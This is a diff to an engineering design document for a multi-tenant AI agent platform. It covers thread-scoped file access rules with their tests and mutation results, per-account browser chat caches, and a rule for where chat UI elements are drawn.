+9. **No thread folder in a chat, no document.** A chat run whose thread id
+   names no folder writes nothing. The upload route and the broker have the
+   same rule (§22.4 rule 9).
+
+**Acceptance.** Each item has a test in `tests/unit/test_h227_thread_scope.py`.
+
+1. Alice uploads through the real route, and her run writes a document
+   through the real `write_artifact`. Bob is in the same organization, with
+   his own session of the same agent. He cannot list, open, change, delete or
+   promote either file, and he cannot read its history (R8). The fault-in
+   restores nothing for him.
+2. An old flat document opens for the session of Alice that wrote it. That
+   is true for the tenant row and for the older `''` row. It opens for nobody
+   else (R8). Other bytes at that path open for nobody.
+3. An old flat upload opens and promotes only in its own thread (R8).
+4. A rewritten `.cc-instance` marker does not switch the rule off (R8).
+5. `write_artifact` writes into the thread folder, and the card and the link
+   name that path. A thread id that names no folder writes nothing.
+6. `share_artifact` shows only the folders of the chat.
+7. `TenantFileStore` reads and lists only the uploads of its own thread.
+8. The fake Docker mounts only the uploads of the thread, read-only. On the
+   coding image, Bob's container sees none of Alice's uploads and no loose
+   file (`sandbox_docker`).
+9. A personal agent keeps its flat folders.
+
+**Mutations.** Each mutation below turned at least one test red, on
+2026-10-04.
+
+| Mutation | Tests that fail |
+|---|---|
+| `is_other_thread_rel` checks `outputs/` only | 3 |
+| `write_artifact` writes the flat `outputs/` again | 9 |
+| `share_artifact` takes a path as it is again | 1 |
+| `share_artifact` shows a loose file | 1 |
+| `TenantFileStore` maps `inputs/` to the shared `inputs/` | 2 |
+| the broker drops the upload cover | 2 |
+| the upload cover is writable | 2 |
+| the tree route drops the loose rule | 4 |
+| the file route drops the loose rule | 4 |
+| the fault-in writes before the history check | 2 |
+| the history route drops the loose rule | 2 |
+| the DELETE route drops the loose rule | 3 |
+| the PUT route drops the loose rule | 3 |
+| the promote route takes the upload of another thread | 1 |
+| the promote route drops the loose rule | 1 |
+| `_session_wrote` ignores the session | 1 |
+| `_session_wrote` ignores the sha256 | 3 |
+| `_session_history` reads the marker for the store key | 6 |
+| `_session_history` drops the older `''` rows | 1 |
+| the session filter of `file_history` names the wrong column | 4 |
+
+**The other-thread rule, route by route.** Bob asks for
+`inputs/<thread slug of Alice>/<name>` from his own session. The fence of
+each route is `test_alices_upload_and_document_are_invisible_to_bob`, except
+where the table names another test. Three routes have two layers, so a
+mutation of one layer alone stays green. The table shows those too.
+
+| Route or path | Mutation | Tests that fail |
+|---|---|---|
+| tree | the other-thread filter dropped | 1 |
+| `GET .../file` | the other-thread check dropped | 1 |
+| history | the row filter dropped | 1 |
+| history | the path check dropped, and the row filter kept | 0, the row filter holds |
+| history | both checks dropped | 1 |
+| DELETE | the route check and `_apply_write_rules` dropped | 1 |
+| DELETE | the route check dropped, and `refused_write` kept | 0, `refused_write` answers 404 |
+| PUT | the route check and the thread rule of `refused_write` dropped | 1 |
+| PUT | the route check dropped, and `refused_write` kept | 0, `refused_write` answers 404 |
+| promote | the other-thread check dropped | 1 |
+| `TenantFileStore` (`test_the_file_tools_see_only_this_threads_uploads`) | `inputs/` maps to the shared `inputs/` | 2 |
+| the container (`test_a_projects_container_mounts_only_its_own_uploads_read_only`, `test_docker_a_thread_sees_only_its_own_uploads`) | the upload cover dropped, or made writable | 2 each |
+
+**What H-227 does not do.**
+
+- The files in the flat folders stay on disk. Nothing moves them into a
+  thread folder, because a history row does not always name a thread.
+- **A loose file with no history row opens for nobody.** Before H-227 the
+  routes served such a file to every member of the organization. Now nobody
+  lists or opens it. Who loses what: a document from before S15 had no row
+  (§21.15), so its link answered 404 already. A file that a run wrote while
+  the store was down, or a file that a member copied onto the disk, now
+  shows to nobody. HANDOFF H-239 counts such files on production. Then the
+  supervisor decides on an admin view.
+- The history route reads the tenant key only, as before. So it does not
+  show a row of the older `''` key.
+- **Who loses what, a batch document** (corrected in fix round 3). On main,
+  every member read a batch document in the flat `outputs/`. Fix rounds 1
+  and 2 read its row, actor `agent` and session `<agent>:<run id>`, as the
+  row of a chat. No chat had that id, so the document showed to nobody. The
+  verifier found it. Now that exact form is a batch row (rule 8). So every
+  member reads such a document again, and nobody changes it. A chat run's
+  document from before H-227 opens only for its own chat, as before.
+
+**Fix round 1 (the PR #616 review, 2026-10-04).**
+
+1. **`save_note` and `recall_notes` keep to the thread (P1).** Before the
+   fix, `save_note` on a colleague's loose file appended to it. Its history
+   row named the caller's session and the new sha256. So the rule of the
+   time gave the file to the caller, and took it from its owner. Now, in a
+   tenant dir, both tools read `inputs/` and `outputs/` as this chat's own
+   folders. `note_tools._notes_target` does it, over
+   `write_artifact._thread_scoped`. Both tools refuse a loose file and the
+   folder of another chat. `agent-data/NOTES.md` does not change (residual
+   1).
+2. **Ownership stays with the session that began the path (P1).** Rule 2
+   above. A later write of another session makes it no owner. The file
+   then opens for nobody.
+3. **A planted link shows nothing (P3).** A directory share of
+   `share_artifact` checks the resolved path, the path that the card shows.
+   It skips a link outright. So a link that a covered run plants in its own
+   folder shows no file of another chat.
+4. **A deleted chat takes its files.** A client chooses the id of a chat
+   session. `POST /chat/sessions` takes `id` from the body, and
+   `sessions.ts` makes it. So after a delete, a member who knows the id can
+   make a new session with it. The thread rule would then give that
+   session the old files. So the delete route calls
+   `workspace.purge_thread_files` before the row goes (fix round 2). The
+   purge works in
+   every tenant dir of the organization. It removes the two thread folders
+   and the loose files that the chat began. It removes their rows in the
+   blob store and in its history (`acb_memory.purge_files` and
+   `session_paths`). It removes the other history rows of the chat under
+   `inputs/` and `outputs/` too. So `read_attachment` reads none of its
+   older uploads. A loose file that another session began stays, and its
+   ownership does not move. The server still takes the id from the client.
+5. **An assigned task's run keeps its document (P2).** The batch decision,
+   rule 8, gives it a home: the flat `outputs/`, where each member reads it.
+6. **The path of the upload message works in a covered run** (the
+   verifier). The message and the cards name `inputs/<thread slug>/x`, and
+   the model copies that path. `TenantFileStore` reads the own slug as the
+   folder itself, and it refuses the slug of another thread. The broker
+   mounts each folder a second time at its own slug. So a command reaches
+   the file by that path too. The alias of the upload folder is read-only.
+7. **An odd name form answers as absent** (the verifier). A case-insensitive
+   file system read `INPUTS/<thread slug>/x` as the upload folder of that
+   thread. Every session route now refuses a head `inputs` or `outputs` in
+   any case but lower. It also refuses a name that ends in a dot or a space
+   (`workspace._odd_name_form`).
+
+**The mutations of fix round 1.** Each one turned at least one test of
+`tests/unit/test_h227_thread_scope.py` red, on 2026-10-04.
+
+| Mutation | Tests that fail |
+|---|---|
+| `save_note` takes a plain path again | 2 |
+| `recall_notes` takes a plain path again | 1 |
+| `_session_wrote` drops the first-writer check | 2 |
+| the history route drops the owner check of a loose row | 1 |
+| a directory share checks the link path and keeps links | 1 |
+| the delete route skips the purge | 1 |
+| the purge skips the loose files that the chat began | 1 |
+| the purge leaves the thread folders on disk | 1 |
+| the purge leaves the store rows of the thread folders | 1 |
+| the purge leaves the other history rows of the chat | 1 |
+| the store takes no own slug off a path | 2 |
+| the store takes the slug of another thread off too | 2 |
+| the broker drops the alias mounts | 2 |
+| the alias of the upload folder is writable | 2 |
+| a batch run writes the thread folder | 2 |
+| a batch run may replace a file | 1 |
+| the batch mark read from the shape of the thread id | 1 |
+| a thread id from a client makes a batch run | 1 |
+| a delegated run is a batch run | 1 |
+| the routes drop the batch read rule | 1 |
+| a batch document has an owner, so a member may change it | 1 |
+| a batch row told by its actor alone | 1 |
+| the history route hides the rows of a batch document | 1 |
+| the purge reaches a batch row | 1 |
+| no refusal of an odd name form | 1 |
+| a trailing dot allowed | 1 |
+
+**Fix round 2 (the second review, 2026-10-04).**
+
+1. **A batch run takes a free name in one step.** A member's loose file can
+   be missing on disk and kept in the store. So the batch run checks the
+   history of a name and the disk. Then
+   `safe_open.write_bytes(..., exclusive=True)` takes the name, so two batch
+   runs never write one name (`write_artifact._take_batch_name`).
+2. **The purge reads before it changes anything.** `session_paths` now
+   raises on a database error. An empty history read of a path that the
+   chat wrote raises too. So a failed read deletes no row and no file, and
+   no ownership moves.
+3. **The purge runs before the delete.** The route checks that the caller
+   owns the chat (`chat._may_delete_session`, the predicate of
+   `_delete_session`). Then it purges, and only then it deletes the row. A
+   failed purge answers 503, the chat stays, and the member can try again.
+   A second pass after the delete sweeps a file that a run wrote in
+   between. That pass only logs.
+4. **The empty dir of an alias mount** does not show in the Files tree,
+   because the tree lists files only.
+
+| Mutation | Tests that fail |
+|---|---|
+| a batch run checks no history before it takes a name | 2 |
+| a batch run writes with no exclusive create | 2 |
+| `session_paths` swallows its error | 1 |
+| an empty history read goes on | 1 |
+| a failed purge only logs | 1 |
+| the row goes before the purge | 3 |
+
+**Fix round 3 (the third review, 2026-10-05).**
+
+1. **A new chat never inherits files** (the supervisor's decision). On
+   main, the delete route removed the chat row and nothing else. So the
+   files and rows of such a chat stayed, and a member who made a chat with
+   the old id read them. Now every door that makes a new chat purges the id
+   first (`chat.prepare_new_session`). A purge that fails answers 503, and
+   no row is made. The doors are `POST /chat/sessions` when it inserts a row
+   (not when it updates one), and the three run doors when the room lookup
+   finds no row. So the step closes every leftover, old or future.
+2. **No new chat can take a run's id.** The executor mints `<agent>:<run
+   id>` for a run with no chat, and the card of its document shows the run
+   id. Each door above refuses a new id with a colon (400,
+   `chat.refuse_run_shaped_id`). Every client mints a chat id with
+   `crypto.randomUUID()` (`lib/sessions.ts`), so no real id has a colon.
+   The server mints `<agent>:<run id>` and `email-chat:...` itself, through
+   none of these doors. An existing row keeps its id.
+3. **An older batch document is the organization's again.** Rule 8 and the
+   who-loses-what line above. `workspace._is_batch_row` and
+   `blob_store._RUN_ROW` are the one rule in Python and in SQL. The tree,
+   the purge and `session_paths` use it.
+4. **The run doors with no stream check the room.** `POST /agent/run` and
+   `/agent/run/async` took a client thread id with no room check. So a
+   member who knew the id of another member's chat ran a shared agent in it
+   and read its folders. They now refuse a caller who may not send in the
+   room, as the stream door does (`agent._guard_run_thread`).
+5. **The purge keeps a file that another session rewrote.** Main let any
+   session change a loose file. When the newest write of a loose file that
+   the chat began is another session's, the purge keeps the file and its
+   other rows. It deletes only the rows of the chat. Then the oldest
+   remaining write is the first writer. When that session also wrote the
+   bytes on disk, that session owns the file. It owns only bytes that it
+   wrote, because the chat's bytes are not on disk and its rows are gone.
+   Otherwise nobody owns the file, and it shows to nobody.
+6. **One 404 for an odd name form.** `_open_rel` checks the name form
+   before the containment check. Windows resolved a missing `a /x` or
+   `a../x` outside the root, so a missing file answered 400 and a real one
+   answered 404. Now both answer 404.
+
+| Mutation | Tests that fail |
+|---|---|
+| the chat door skips the new-chat step | 3 |
+| the run door skips the new-chat step | 3 |
+| every upsert purges, not only a new row | 2 |
+| a failed purge still makes the chat | 1 |
+| a chat id with a colon is taken | 3 |
+| no older batch row in Python | 2 |
+| the older match is a suffix, not exact | 2 |
+| the SQL rule knows only the actor `batch` | 1 |
+| the purge deletes an older batch row | 1 |
+| the tree finds a batch file by the actor alone | 1 |
+| the purge deletes a file that another session rewrote | 1 |
+| the containment check runs first (Windows only) | 1 |
+| the run doors with no stream drop the room check | 1 |
+| the run doors with no stream skip the guard | 2 |
+
+**Residuals, named.**
+
+1. **`agent-data/` of a shared agent is one folder for the whole
+   organization, and so it is a channel between members.** A fact that one
+   member's run saves to `agent-data/NOTES.md` reaches the run of each other
+   member. The session routes serve `agent-data/` to every session. It is
+   older than H-227, and this PR keeps it. To make it per member or per
+   thread is a decision about the memory of a shared agent. HANDOFF H-237
+   carries it.
+2. **A live container of the thread** keeps its mounts of the removed
+   folders until it stops.
+3. **The member purge of the admin routes deletes private chats and keeps
+   their folders** (`routes/admin/members.py`). Only the purged person knew
+   those ids. HANDOFF H-237 carries it.
+4. **Other state keyed by a chat id** is outside H-227: the room memory
+   `room:<id>` and the room stream. A new session with an old id can reach
+   it. Its files and file rows are purged (fix round 3).
+5. **The Windows dev box only.** NTFS does not tell `OUTPUTS/` from
+   `outputs/`. The rules compare the head of a path as the caller wrote it.
+   So on a Windows dev box, `OUTPUTS/<thread slug>/x` names the folder of
+   that thread, and it passes the rules. Production runs on Linux. There
+   that path names another folder, and no route lists it.
+6. **A slow mint and a late create.** A run door purges a new id, and then
+   the run's mint makes the row. When the mint times out, the run goes on
+   with no row. A `POST /chat/sessions` that arrives then sees no row, and
+   its purge can remove the first files of that run. HANDOFF H-242 step 3.
+7. **The stream door with no thread id** mints the thread `<agent>:<run
+   id>` from a run id that the client may choose. It makes no batch run.
+   Its documents go in its own thread folder, never in a loose file, so it
+   cannot forge an older batch row. The purge never deletes one.
+8. **A null room skips the purge.** A run door reads a room of `None` as
+   "not new". `_resolve_room` gives `None` on an exception, or when the
+   caller has no email. HANDOFF H-242 step 1.
+9. **The next writer can own the deleted chat's text** (fix round 3 item
+   5). The bytes that another session wrote can still hold the text of the
+   chat that began the file. HANDOFF H-242 step 2 decides: delete such a
+   file, or keep it with no owner.
+
+**Verification.**
+
+```bash
+eval "$(bash scripts/dev_db.sh --export)"
+uv run pytest tests/unit/test_h227_thread_scope.py \
+  tests/unit/test_run_data_hygiene.py tests/unit/test_h201_tenant_workdirs.py \
+  tests/unit/test_h201_run_context.py tests/unit/test_h201_readers_under_rls.py \
+  tests/unit/test_read_attachment.py -q -rs
+uv run pytest tests/unit/test_h227_thread_scope.py \
+  tests/unit/test_run_data_hygiene.py -m sandbox_docker -rs
+```
+
+The `-rs` output must show no skip, except the Windows-only skips.
+
+
+---
+
+## 23. Chat cache namespaces and multi-account (PR #652)
+
+**Every per-member chat cache in the browser lives in one namespace per account.** The scope `<email>|<orgId>` names the namespace. A switch of accounts deletes nothing. A sign-out of an account clears that account only.
+
+### 23.1 The bug that made this necessary
+
+On 2026-10-05 a DEWiN member opened the Projects AI chat on a shared browser. The rail restored the last chat of the owner, from the Fracktal org. The gateway refused every send with "You are not a participant of this conversation". The refusal was correct, and the member saw only an error.
+
+The cause was one browser-wide key, `cc-chat-sessions`. Each rail restored the newest session of its agent from that key, for every member of the browser.
+
+### 23.2 The rule
+
+1. `lib/sessions.ts` builds every chat key with one helper, `chatKey(kind, id?)`. The key is `cc-chat::<scope>::<kind>[::<id>]`. There are four kinds:
+   - `sessions`: the session list.
+   - `msgs`: the transcript. It also holds compaction summaries and the replies kept only in the browser.
+   - `queue`: the unsent messages.
+   - `builder`: the per-app session id of the app builder.
+2. The scope comes from `useAccess()`, the one identity source of the client. `scopeFromAccess` holds the rules. `useChatScope` binds the scope.
+3. While no scope is bound, every read is empty and no local write occurs. The server copy still syncs.
+4. **A switch deletes nothing.** When the bound scope changes to another email, or to the same email in another org, the old namespace stays. A switch back finds it as it was.
+5. **A sign-out clears that account only.** `useChatSignOutClear` in `AppShell` binds the clear to the identity, the pattern of `bindIdentity` in `lib/dataCache.ts`. It covers a sign-out button, an expired session, the middleware redirect and the NextAuth sign-out page. The client cannot always tell which account ended. So it clears every namespace of the last bound email, which `cc-chat-last-scope` records.
+6. A sign-out needs two answers that agree: NextAuth says nobody is signed in, and an authoritative access answer names nobody. A deploy restart answers `GET /api/auth/me` with a 200 that names nobody, while NextAuth still holds the session. So a deploy restart clears nothing.
+   - **Then the client confirms** (round 3). NextAuth's client turns a FAILED session fetch into "unauthenticated" for the life of the page. A deploy that restarts Next and the gateway close together can so satisfy both answers.
+   - So before it clears, `confirmSignedOut` asks `/api/auth/session` again, with no cache and a 5 s limit.
+   - It clears only on a 2xx whose session names no user. A network error, a non-2xx, a body that does not parse, a timeout or a live session clears nothing.
+7. During that restart, a member already seen in the page keeps their scope (`lastMemberScope`). The rails do not move to a new chat.
+8. **The caches from before #652 have no owner.** `purgeLegacyChatCaches` deletes them on the first bind. Nothing moves them into a namespace, because nobody can know whose they are.
+9. A recovery from a refused chat (`lib/railSessions.ts`) carries only the queue of the current namespace into the composer.
+
+### 23.3 The future account switcher
+
+The owner plans one browser signed in to several accounts at once. **The switcher only changes the bound scope** (`bindChatScope`). It deletes nothing, and each account keeps its chats. **The clear point is the sign-out of one account.** When the switcher can name the account that signed out, it clears that account's namespaces. Until then, the client clears the last bound scope.
+
+⚠️ **`cc-chat-last-scope` is ONE pointer per browser.** It is enough for one signed-in account. The switcher needs one pointer per signed-in session, so that the sign-out of one account can name that account. Replace the pointer when the switcher lands.
+
+**Not built: moving the caches from before #652.** The first bind deletes them, so a queue of unsent text from before #652 is lost once. A softer path is possible. After the server list merges, it moves a legacy entry into the namespace of a member whose own server list holds that session id. It needs a second step after the merge, so it was left out of PR #652.
+
+### 23.4 Fences
+
+`src/lib/railSessions.test.ts`:
+
+- A switch from A to B and back keeps both namespaces exactly.
+- B never reads the transcript or the queue of A, even with A's session id.
+- A sign-out of A clears every namespace of A, and the namespace of B stays.
+- An expiry on a fresh page clears the namespace of the last bound scope.
+- The caches from before #652 go on the first bind.
+- A deploy restart deletes nothing.
+- A sign-out clears nothing until `/api/auth/session` confirms it. A failed or slow confirm clears nothing.
+- A grep fails on a raw `cc-msgs`, `cc-queue`, `cc-chat` or `cc-app-builder-session` key anywhere outside `lib/sessions.ts`. Inside that file, every storage call takes a built key.
+
+A new chat cache uses `chatKey`. The grep fence makes a raw key fail.
+
+
+## 24. Where each element of a turn goes (the placement rule, 2026-10-08)
+
+**This is the placement rule of record.** The owner accepted it on 2026-10-08.
+It binds every chat surface: `/chat` and the Projects, Tasks and email rails.
+They all draw through `AgentChat`, so one rule covers them.
+
+### 24.1 The report that made it necessary
+
+The owner sent screenshots of the Projects rail. The assistant drew an option
+picker, "Which tags should I register on «Metorite»?". Under it, at the end of
+the turn, it drew four receipt cards: "Projects", "Vocabulary", "Tasks (10)"
+and "Task dataset". The last one was the model's text as it is: a header line
+`number | title | status | …` and rows such as `#11 | Task … | To do | todo |
+| Bug`.
+
+The owner had to answer the picker, and it "got lost above in the chat". The
+owner asked for clear rules, so that the generative UI does not overload the
+member.
+
+**The cause.** `MessageBubble.tsx` drew the turn in this order: the trail
+(`MarkdownMessage` → `ThinkingContainer`), the answer text, the
+generative-UI cards, and then `EmailToolCards`, `TaskToolCards` and
+`ProjectToolCards`. Each card file drew a card for EVERY finished tool, a
+read or a write. So the receipts of four reads drew after the picker that the
+turn asked the member to answer. `task_dataset` had no entry in the card file,
+so the generic card drew its text through `Readout`, pipes and all.
+
+### 24.2 The rule
+
+Every element of an assistant turn is one of four kinds.
+
+1. **NEEDS THE MEMBER** — a confirmation card, an option picker, a form,
+   `ask_questions`. It stays in the flow, in order. While it waits, a compact
+   bar above the composer names it, so it can never scroll out of view. The
+   bar shows only while the element is out of view, and a press scrolls to
+   it. Answering the element removes the bar. The bar reuses the "1 of N"
+   confirmation queue and adds no state of its own.
+2. **EVIDENCE** — the result of a READ. Examples are `projects_tree`,
+   `vocabulary`, `list_tasks`, `find_tasks`, `task_detail`, `task_dataset`,
+   `project_summary`, `my_work`, and the email and Tasks reads. It draws
+   INSIDE the working trail, under the step that made it, closed by default.
+   It never draws as a card after the answer.
+3. **THE RESULT OF A WRITE** — done, part done, unknown, refused, cancelled.
+   It draws compact, in the flow, after the answer text.
+4. **THE ANSWER ITSELF** — a card the model chose to draw: a plan, a board, a
+   report, a table. At most ONE for an answer, after the text. A list of fewer
+   than six items stays Markdown, with no card.
+
+### 24.3 What is built
+
+| Part | Where | What it does |
+|---|---|---|
+| The one map | `src/lib/chatPlacement.ts` | `PLACEMENT` gives each tool name a kind. The card files and the trail read it, and none of them guesses from a name. `genUiPlacement` reads a generative-UI SPEC: a `request_id`, a form, a picker, a plan to submit or a button make it an ask. |
+| Evidence in the trail | `ThinkingContainer.tsx` `ToolStepRow`, `evidenceFor` | `MessageBubble` hands each step its receipt from the card files (`projectEvidence`, `taskEvidence`, `emailEvidence`). A step with a receipt shows its chevron at rest. Open, it draws the receipt in place of the raw arguments and output. `InStepContext` takes the dismiss control off a card in a step. |
+| The flow | `ProjectToolCards`, `TaskToolCards`, `EmailToolCards` | Each draws only the writes, and a view that failed. A read is not drawn there. |
+| The pin | `src/lib/askPin.ts`, `src/components/AskPin.tsx`, `AgentChat.tsx` | `pendingAsk` reads the confirmation queue, the question cards and the newest turn's generative-UI ask. An element in the thread carries `data-chat-ask`. The bar watches it with an `IntersectionObserver` and shows while it is out of view. |
+| The dataset table | `src/lib/datasetTable.ts`, `DatasetView` in `ProjectToolCards.tsx` | Both shapes of `task_dataset` (the rows and the groups) draw through the `dataGrid` template, with each column named by its card label, no «mark», and no line meant for the model. |
+
+**When the pin goes.** A confirmation or a question leaves the bar when the
+member answers it. A BLOCKING generative-UI ask has a `request_id`. It waits
+only while the run is live and the member has not answered it. So a run that
+ends without an answer clears it. A non-blocking ask is answered by a new chat
+message, so it waits only while its turn is the newest message.
+
+**A tool the map does not name.** In `ProjectToolCards`, it counts as a read
+and draws in its step. The two fences below keep every tool a card file draws
+named, so only a tool from a newer server can land there. A hidden receipt is
+the smaller harm.
+
+**The other reads.** Only `task_dataset` printed a pipe table. Every other
+Projects read prints `·`-separated rows, which `Readout` already draws as UI.
+The groups shape of `task_dataset` (`key · value · n`) now draws as a table
+too.
+
+### 24.4 What the agents are told
+
+Five agents carry one section, "Where each part of your answer goes", word for
+word: `agent-projects`, `agent-email-assistant`, `agent-crm`,
+`agent-whatsapp-assistant` and `agent-orchestrator`. It says:
+
+- The chat shows each read under its step. So never draw a read's result
+  again as a card.
+- Give a list the member asked for once. A long one can be the one card.
+- Draw one card for an answer, at most, after the text.
+- A list of fewer than six items stays a Markdown list.
+- A confirmation, a form or a picker is not the answer card.
+
+The injected UI directive (`acb_skills/addendum.py` `ui_first_directive`)
+reaches every agent that holds `emit_generative_ui`. Both its variants end
+with the same rule, `PLACEMENT_RULE`.
+
+The Projects agent no longer says "Prefer a card for a list of things". The
+email agent shows a list the member asked to see as ONE `present_email_groups`
+board, because the reads are now closed in the trail.
+
+### 24.5 Several new tags, types or statuses
+
+**BUILT 2026-10-08 for tags and types (H-273, branch `projects-vocab-batch`).**
+`create_tags(project_id, tags)` and `create_types(project_id, types)` take
+the words in ONE call. They use the rows card of
+`request_confirmation(rows=…)` (#691), as `create_tasks` does: ONE card with
+a checkbox for each word.
+
+- **One helper, two kinds.** `forms.py` `_VocabKind` holds what differs: the
+  row keys, the route and the words. `_vocab_plan` does every read before the
+  card, and `_vocab_write` does the writes after it. Each tool calls
+  `_confirm` itself, so the source fence of the one card door still sees it.
+- **A row means what the single tool's argument means.** A tag row takes
+  `name`, `color` and `description`, as `create_tag` does. A type row takes
+  `name`, `icon`, `color` and `is_epic`, as `create_type` does. A plain name
+  is a row too. An organization-wide word, and the default type, stay with the
+  single tool, one call each.
+- **Before the card.** Four faults stop the batch, and nothing is drawn: a
+  duplicate name in the batch, an unknown key, more than `MAX_BATCH` rows, and
+  a card that `_fits_on_card` refuses. A name that the project has already starts unticked, and
+  its hint gives the reason. An organization-wide match says that a tick adds a
+  copy for this tree (D-PM-16).
+- **After the card.** The tool writes exactly the ticked rows, in the card's
+  order, with one POST each to the route of `create_tag` or `create_type`. An
+  id that the card did not offer writes nothing (`FORGED_ROWS`).
+- **The server decides (§16 of `projects_agent_parity.md`).** The tool reads
+  no permission and decides none. A refusal of the route, a 403 or a 409, is
+  quoted in the receipt for its row. A row that fails does not stop the next
+  row, and nothing raises after the first write.
+- **The receipt.** For each word made, it prints `- tag «name» · facts` and
+  then `  tag_id: <uuid>`. Each fact is fenced with `data()`. Then it prints a
+  `failed:` or `unknown:` line for each row that failed, a `stopped:` line and
+  the rows left out. `BatchReceiptCard` draws a
+  tag as the tag pill and a type as a plain pill.
+
+**Statuses are not built.** The status route inserts a second lane with the
+same name, and each lane needs its own position and the server's `may_edit`
+first. That is more than a few lines on the helper, so HANDOFF H-274 carries
+it. Until then, the Projects agent calls `create_status` once for each new
+status, one after another.
+
+### 24.6 Fences (R7)
+
+| Rule | Fence |
+|---|---|
+| Every tool a card file draws is classified | `src/lib/chatPlacement.test.ts` |
+| Every `skill-projects` tool is classified, and a class A tool is evidence (or an answer for a view), a class B or C tool a write | `tests/unit/test_chat_placement_classes.py` |
+| An email tool that sends, writes to the provider or destroys is never evidence | `tests/unit/test_chat_placement_classes.py` |
+| A read draws in its step, and a write in the flow. The owner's turn has four steps that open, and no read card | `src/lib/chatPlacement.test.ts` |
+| The pin shows for a waiting element, and an answer, a run end or a later message clears it | `src/lib/askPin.test.ts` |
+| `task_dataset` draws as a table, with no pipe and no mark | `src/lib/datasetTable.test.ts` |
+| Five agents carry the one section, word for word | `tests/unit/test_chat_placement_instructions.py` |
+| The injected directive ends with the rule | `tests/unit/test_genui_proactive_directive.py` |
+| At most one answer card per answer, and no card that repeats a read | `evals/projects_ops/checkers.py` `one_answer_card`, `no_read_recarded`, held by `tests/unit/test_projects_ops_eval.py` |
+| Several new tags or types are ONE card with a checkbox for each, and the server decides each row (H-273) | `tests/unit/test_projects_create_vocab.py`, `test_projects_field_parity.py` (the row exception), eval task PO-11 |
+
+**Advisory.** A receipt in a step stays mounted after the member opens it,
+so a closed step keeps what the member did in it. Nothing tests that, because
+the markup tests cannot change state.
+
+Nothing tests the "at most one card" rule in the UI itself. The chat draws
+every card the model emits, and the instructions and the eval hold
+the count. Nothing tests the bar's in-view check, because it needs a browser.
+The visual review (24.7) looked at it.
+
+### 24.7 The visual review
+
+The rig streamed the owner's turn into `/chat` and into the Projects rail, in
+dark, light and at 390px, before and after the change.
+
+- **Before.** The four receipts drew under the picker. In the rail at 1440 and
+  at 390, the picker scrolled out of view, and "Task dataset" showed the pipe
+  dump.
+- **After.** The trail is one closed line, "Read 3 items, ran 1 search". The
+  answer text and the picker sit at the bottom, in view with no scroll. Opened,
+  each read sits under its step, and the dataset is a table. When the member
+  scrolls up to read the steps, the bar "Waiting for your choice" shows above
+  the composer.
+
+It found one defect, now fixed: the picker's and the form's titles showed the
+«marks». They now draw through `GenUiText`, and the bar's title through
+`unfenced`.
+
+### 24.8 Follow-ups of #716 and #735: the data in a turn
+
+A review of the chat's data after #716 and #735 found six defects. This
+section records each one and its fix. The placement rule (24.2) does not
+change.
+
+| # | Defect | Fix |
+|---|---|---|
+| 1a | The dataset table showed a raw category ("in_progress", "todo") in its own column, beside the status. | `lib/dataGridLayout.ts` gives each column a kind. A status is its chip, and a category is its readable label (`categoryLabel`). A category column that `task_dataset` names hides when a status column is there, and its cell gives the status chip its colour. A column that a model names "Category" is text, and it always shows. |
+| 1b | In the Projects rail, the title wrapped one word per line, and the last column was cut with no cue. | The title has a least width of 10rem and wraps. A box narrower than the sum of the least widths draws stacked rows: the number and the title, then chips and labelled facts. A wider table that overflows shows "More columns to the right". |
+| 2 | A board card put the priority chip beside the title, so a long title wrapped one word per line. | The title has the card's whole width. The chip, the assignees and the due date sit under it. |
+| 3 | The email and CRM reads drew the tool's text as it is, with `id=<uuid>` in it. | They draw through the one `Readout`, now `components/Readout.tsx`. A `•` row is an item, and a `• key: value` row is a labelled fact. `withoutIds` removes an `id=`, and a `[kind]` is a chip. The CRM reads draw in their step (`crm/CrmEvidence.tsx`). |
+| 4 | `task_detail` drew "Priya (priya@x.io)" as one label, with "P(" as its initials. | `personOf` splits the name from the address. The chip shows the name, and its tooltip holds the address. |
+| 5 | The templates drew text at `fontSize: 11` to `14`, in px, so the text did not follow the density. | `lib/typeScale.ts` holds the type scale in rem. Each template takes its size from it. |
+| 6 | `ChoiceBlock` and `CodeBlock` used raw palette classes. | They use tokens. The palette budget of `MarkdownMessage.tsx` went from 7 to 0. |
+
+**The data of a column.** `task_dataset` sends a kind for each column, from
+its card key (`lib/cardFields.ts`). A template the model draws sends labels
+only. Then a column takes the kind of its card label (`kindForLabel`), so
+"Status" is a chip and "Assignees" is a person chip. A task or a project
+label stays text, because a label carries no link.
+
+**Fences (R7).**
+
+| Rule | Fence |
+|---|---|
+| The column rules and the width where the rows stack | `src/lib/dataGridLayout.test.ts` |
+| A category draws as its label, and never as its key | `src/lib/dataGridLayout.test.ts`, `src/lib/datasetTable.test.ts` |
+| The email and CRM reads show no id, and label each fact | `src/components/readoutEmailCrm.test.ts` |
+| A CRM read is evidence, and a CRM write is a write | `tests/unit/test_chat_placement_classes.py` |
+| An assignee is a person chip, and the board title has the card's width | `src/components/personChips.test.ts` |
+| No template file sets a font size in px | `src/lib/typeScale.test.ts` |
+
+**Advisory.** No test reads the "More columns to the right" cue, because it
+needs a real layout. The visual review looked at it.
